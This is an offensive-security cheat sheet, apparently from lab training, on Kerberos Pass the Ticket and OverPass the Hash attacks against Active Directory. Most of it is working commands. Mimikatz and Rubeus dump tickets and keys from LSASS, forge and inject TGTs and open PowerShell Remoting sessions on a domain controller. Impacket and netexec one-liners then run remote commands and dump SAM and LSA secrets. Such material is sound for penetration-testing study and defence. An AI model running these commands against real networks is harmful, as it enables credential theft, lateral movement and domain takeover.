In this attack, we use a stolen Kerberos ticket to move laterally instead of an NTLM password hash.
We need a valid Kerberos ticket to perform a `Pass the Ticket (PtT)` attack. It can be:
- Service Ticket (TGS) to allow access to a particular resource.
- Ticket Granting Ticket (TGT), which we use to request service tickets to access any resource the user has privileges.

## Harvesting Kerberos tickets from Windows (From LSASS)
As a non-administrative user, you can only get your tickets, but as a local administrator, you can collect everything.
#### Mimikatz - Export tickets (First Method - .kirbi tickets)
```cmd
mimikatz # privilege::debug

mimikatz # sekurlsa::tickets /export
...
...
mimikatz # exit

c:\tools> dir *.kirbi
```
- The tickets that end with `$` correspond to the computer account, which needs a ticket to interact with the Active Directory.
- User tickets have the user's name, followed by an `@` that separates the service name and the domain, for example: `[randomvalue]-username@service-domain.local.kirbi`.
**Note:** If you pick a ticket with the service krbtgt, it corresponds to the TGT of that account.
#### Rubeus - Export tickets (Second Method - base64 encoded tickets)
`Rubeus dump`, instead of giving us a file, will print the ticket encoded in Base64 format. We are adding the option `/nowrap` for easier copy-paste.
```cmd
Rubeus.exe dump /nowrap
```
**Note:** To collect all tickets we need to execute Mimikatz or Rubeus as an administrator.

---
## Pass the Key aka. OverPass the Hash (Convert Hash to TGT)
The `Pass the Key` aka. `OverPass the Hash` approach converts a hash/key (rc4_hmac, aes256_cts_hmac_sha1, etc.) for a domain-joined user into a full `Ticket Granting Ticket` (`TGT`).
#### Mimikatz - Extract Kerberos keys
```cmd
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::ekeys

<SNIP>
* Key List :
           aes256_hmac       b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60
           rc4_hmac_nt       3f74aa8f08f712f09cd5177b5c1ce50f
           rc4_hmac_old      3f74aa8f08f712f09cd5177b5c1ce50f
           rc4_md4           3f74aa8f08f712f09cd5177b5c1ce50f
           rc4_hmac_nt_exp   3f74aa8f08f712f09cd5177b5c1ce50f
           rc4_hmac_old_exp  3f74aa8f08f712f09cd5177b5c1ce50f
<SNIP>
```
Now that we have access to the `AES256_HMAC` and `RC4_HMAC` keys, we can perform the OverPass the Hash aka. Pass the Key attack using `Mimikatz` and `Rubeus`.
#### Mimikatz - Pass the Key aka. OverPass the Hash
```cmd
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f
```
This will create a new `cmd.exe` window that we can use to request access to any service we want in the context of the target user.
#### Rubeus - Pass the Key aka. OverPass the Hash (Use /ptt to inject ticket in current session as shown below (PtT))
To forge a ticket using `Rubeus`, we can use the module `asktgt` with the username, domain, and hash which can be `/rc4`, `/aes128`, `/aes256`, or `/des` (Found via sekurlsa::ekeys).
```cmd
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap
```

**Note:** Mimikatz requires administrative rights to perform the Pass the Key/OverPass the Hash attacks, while Rubeus doesn't.

---
## Pass the Ticket (PtT)
Now that we have some Kerberos tickets, we can use them to move laterally within an environment.
With `Rubeus` we performed an OverPass the Hash attack and retrieved the ticket in Base64 format. Instead, we could use the flag `/ptt` to submit the ticket (TGT or TGS) to the current logon session.
#### Rubeus - Pass the Ticket
```cmd
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt
```
#### Rubeus - Pass the Ticket
Let's use a ticket exported from Mimikatz and import it using Pass the Ticket.
```cmd
Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
```

#### Pass the Ticket - Base64 Format
Use base64 ticket retrieved with Rubeus OR convert .kirbi and convert it to Base64 liek this:
```powershell
[Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))
```

Then use Rubeus to Pass-The-Ticket
```cmd
Rubeus.exe ptt /ticket:doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA/VhggPxMIID7aADAgEFoQkbB0hUQi5DT02iHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB2h0Yi5jb22jggO7MIIDt6ADAgESoQMCAQKiggOpBIIDpY8Kcp4i71zFcWRgpx8ovymu3HmbOL4MJVCfkGIrdJEO0iPQbMRY2pzSrk/gHuER2XRLdV/...SNIP...
```

#### Mimikatz - Pass the Ticket
Finally, we can also perform the Pass the Ticket attack using the Mimikatz module `kerberos::ptt` and the .kirbi file that contains the ticket we want to import.
```cmd
mimikatz # privilege::debug

mimikatz # kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"

* File: 'C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi': OK
mimikatz # exit
```
We have a new session as the ticket user context. 
**Note**: Use `misc::cmd` with mimikatz to perform the same task but open a new window.

---
## Pass The Ticket with PowerShell Remoting (Windows)
To create a PowerShell Remoting session on a remote computer, you must have administrative permissions, be a member of the Remote Management Users group, or have explicit PowerShell Remoting permissions in your session configuration.

#### Mimikatz
```cmd
mimikatz # privilege::debug

mimikatz # kerberos::ptt "C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"

mimikatz # exit
Bye!

c:\tools>powershell

PS C:\tools> Enter-PSSession -ComputerName DC01
[DC01]: PS C:\Users\john\Documents> whoami
inlanefreight\john
```

#### Rubeus
Create a sacrificial process with Rubeus:
```
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
```
The above command will open a new cmd window. From that window, we can execute Rubeus to request a new TGT with the option `/ptt` to import the ticket into our current session and connect to the DC using PowerShell Remoting.

Pass the Ticket for lateral movement:
```cmd
Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt

c:\tools>powershell

PS C:\tools> Enter-PSSession -ComputerName DC01
[DC01]: PS C:\Users\john\Documents> whoami
inlanefreight\john
```

---
## Straightforward Cheatsheet

#### Pass-The-Key
Linux:
```bash
# with an NT hash (overpass-the-hash)
getTGT.py -hashes 'LMhash:NThash' $DOMAIN/$USER@$TARGET

# with an AES (128 or 256 bits) key (pass-the-key) retrieved with sekurlsa::ekeys
getTGT.py -aesKey 'KerberosKey' $DOMAIN/$USER@$TARGET
```

Windows Rubeus:
```cmd
# with an NT hash
Rubeus.exe asktgt /domain:$DOMAIN /user:$USER /rc4:$NThash /ptt

# with an AES 128 key
Rubeus.exe asktgt /domain:$DOMAIN /user:$USER /aes128:$aes128_key /ptt

# with an AES 256 key
Rubeus.exe asktgt /domain:$DOMAIN /user:$USER /aes256:$aes256_key /ptt
```

Windows Mimikatz:
```cmd
# with an NT hash
sekurlsa::pth /user:$USER /domain:$DOMAIN /rc4:$NThash /ptt

# with an AES 128 key
sekurlsa::pth /user:$USER /domain:$DOMAIN /aes128:$aes128_key /ptt

# with an AES 256 key
sekurlsa::pth /user:$USER /domain:$DOMAIN /aes256:$aes256_key /ptt
```
For both mimikatz and Rubeus, the `/ptt` flag is used to automatically [inject the ticket](https://www.thehacker.recipes/ad/movement/kerberos/ptt#injecting-the-ticket).
- On Windows systems, tools like [Mimikatz](https://github.com/gentilkiwi/mimikatz) and [Rubeus](https://github.com/GhostPack/Rubeus) inject the ticket in memory. Native Microsoft tools can then use the ticket just like usual.
- On UNIX-like systems, the path to the `.ccache` ticket to use has to be referenced in the environment variable `KRB5CCNAME`
#### Pass-The-Ticket
Converting ticket if needed:
```bash
# Windows -> UNIX
ticketConverter.py $ticket.kirbi $ticket.ccache

# UNIX -> Windows
ticketConverter.py $ticket.ccache $ticket.kirbi
```

Export ticket on Linux:
```bash
export KRB5CCNAME=$path_to_ticket.ccache
```

Command Execution:
```bash
psexec.py -k 'DOMAIN/USER@TARGET'
smbexec.py -k 'DOMAIN/USER@TARGET'
wmiexec.py -k 'DOMAIN/USER@TARGET'
atexec.py -k 'DOMAIN/USER@TARGET'
dcomexec.py -k 'DOMAIN/USER@TARGET'

netexec winrm $TARGETS -k -x whoami
netexec smb $TARGETS -k -x whoami
```

Credentials Dumping:
```bash
secretsdump.py -k $TARGET

netexec smb $TARGETS -k --sam
netexec smb $TARGETS -k --lsa
```

https://www.thehacker.recipes/ad/movement/kerberos/ptt
